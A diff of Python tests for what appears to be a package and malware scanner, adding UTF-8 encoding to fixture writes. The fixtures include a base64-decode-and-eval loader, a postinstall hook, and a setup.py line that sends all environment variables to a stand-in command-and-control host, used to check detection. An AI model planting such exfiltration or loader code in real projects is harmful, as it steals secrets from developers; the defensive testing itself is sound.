@@ -28,16 +28,18 @@ def config(**kw) -> Config:
 def project(tmp_path):
     root = tmp_path / "repo"
     (root / "src").mkdir(parents=True)
-    (root / "src" / "app.js").write_text("export const x = 1;\n")
-    (root / "src" / "loader.js").write_text("const p = atob(B);\neval(p);\n")
+    (root / "src" / "app.js").write_text("export const x = 1;\n", encoding="utf-8")
+    (root / "src" / "loader.js").write_text("const p = atob(B);\neval(p);\n", encoding="utf-8")
     (root / "package.json").write_text(
         '{"name":"demo","version":"1.0.0","scripts":{"postinstall":"node s.js"},'
-        '"dependencies":{"express":"^4.18.0"}}'
+        '"dependencies":{"express":"^4.18.0"}}',
+        encoding="utf-8",
     )
     (root / "package-lock.json").write_text(
         '{"lockfileVersion":3,"packages":{"":{"name":"demo"},'
         '"node_modules/express":{"version":"4.18.2","integrity":"sha512-a",'
-        '"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}'
+        '"resolved":"https://registry.npmjs.org/express/-/express-4.18.2.tgz"}}}',
+        encoding="utf-8",
     )
     return root
 
@@ -101,7 +103,7 @@ class TestDependencyGraph:
         assert result.stats.dependencies == len(result.dependencies)
 
     def test_no_lockfile_yields_an_empty_graph(self, tmp_path) -> None:
-        (tmp_path / "a.js").write_text("const x = 1;\n")
+        (tmp_path / "a.js").write_text("const x = 1;\n", encoding="utf-8")
         assert Scanner(config()).scan(tmp_path).dependencies == ()
 
 
@@ -297,7 +299,8 @@ class TestInstallHookContext:
         (root / "setup.py").write_text(
             "import os, urllib.request\n"
             "urllib.request.urlopen('https://c2.example.net/i', "
-            "str(dict(os.environ)).encode())\n"
+            "str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
         )
         result = Scanner(config()).scan(root)
         assert any(f.category is Category.MALICIOUS for f in result.findings)
@@ -308,7 +311,8 @@ class TestInstallHookContext:
         (root / "reporting.py").write_text(
             "import os, urllib.request\n"
             "urllib.request.urlopen('https://c2.example.net/i', "
-            "str(dict(os.environ)).encode())\n"
+            "str(dict(os.environ)).encode())\n",
+            encoding="utf-8",
         )
         result = Scanner(config()).scan(root)
         assert not [f for f in result.findings if f.category is Category.MALICIOUS]
